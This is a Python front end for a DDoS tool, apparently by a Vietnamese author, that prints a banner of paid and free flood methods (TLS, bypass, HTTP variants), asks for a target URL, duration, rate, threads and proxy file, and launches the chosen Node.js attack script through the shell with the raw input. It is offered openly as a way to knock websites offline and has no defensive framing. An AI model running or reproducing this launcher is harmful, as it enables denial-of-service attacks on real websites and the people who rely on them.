import subprocess
import subprocess
import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import requests
import time
import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os
osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
ascii = r'''
╔══════════════════════════════╦════════════════════════════════════════════╗  
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║           
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║         
║⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿║   
║⣿⣿⣿⣿⣿⣿⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿║    🚀 DDOS PLAN : ADMIN 🔵HoaiNam          
║⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣦⠀⠀⠀⠘⣿⣿⣿⣿⣿╠═══╦═════════════LIST METHOD═══════════════╣
║⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⠏⠀⠀⠀⠀⠘⣿⣿⣿⣿║ 1 ║    BYPASS        ║    Vip ✔            ║
║⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣥⣷⠇⠀⠀⠀⠀⢹⣿⣿⣿║ 2 ║    SKYNET        ║    Vip ✔            ║
║⣿⣿⣿⡇⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⢸⣿⣿⣿║ 3 ║    HTTP-V4       ║    Basic ✔          ║
║⣿⣿⣿⣿⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣸⣿⣿⣿║ 4 ║    HTTP-SOUND    ║    Basic ✖          ║
║⣿⣿⣿⣿⡆⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠀⠀⠀⠀⢠⣿⣿⣿⣿║ 5 ║    TLS           ║    Vip ✔            ║
║⣿⣿⣿⣿⣿⣄⣠⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⢠⣿⣿⣿⣿⣿║ 6 ║    AQUNET-TLS    ║    Basic ✔          ║
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡍⠀⢀⣴⣿⣿⣿⣿⣿⣿║ 7 ║    YOLO          ║    Basic ✖          ║
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿║ 8 ║    XENN-BYPASS   ║    Vip ✔            ║
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║ 9 ║    BOMB          ║    BaSic ✖          ║
║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║10 ║   404            ║    BaSic ✖          ║
╚══════════════════════════════╩═══╩════════════════════════════════════════╝ 
╔══════════════════════════════════╗
║╔╦╗╔╦╗╔═╗╔═╗  ╔═╗╦  ╔═╗╔╗╔╦  ╦╦╔═╗╠════════════════════════════════════════╗
║ ║║ ║║║ ║╚═╗  ╠═╝║  ╠═╣║║║╚╗╔╝║╠═╝║ HOST METHOD TIME RATE THREAD PROXYFILE ║
║═╩╝═╩╝╚═╝╚═╝  ╩  ╩═╝╩ ╩╝╚╝ ╚╝ ╩╩  ╠════════════════════════════════════════╝
╚══════════════════════════════════╝

 '''




banner = r"""
""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

 

 
print(Colorate.Horizontal(Colors.red_to_blue, banner))
def execute_command(method,target, time, request, thread, proxy_file):
    command = f'node {method}.js {target} {time} {request} {thread} {proxy_file}'
    subprocess.call(command, shell=True)

# Hàm main để lấy thông tin từ người dùng và gọi hàm execute_command
def main():
    target = input("\033[1;36m🔴 Url :")
    method = input("\033[1;36m🔴 method:")
    time = input("\033[1;36m🔴 time:")
    request = input("\033[1;36m🔴 request:")
    thread = input("\033[1;36m🔴 thread:")
    proxy_file = input("\033[1;36m🔴 proxy:")
    print("\033[1;93m⚡Attack Sent :\033[1;95mHoaiNam")
    execute_command(method,target, time, request, thread, proxy_file)

# Gọi hàm main để chạy công cụ
if __name__ == "__main__":
    main()
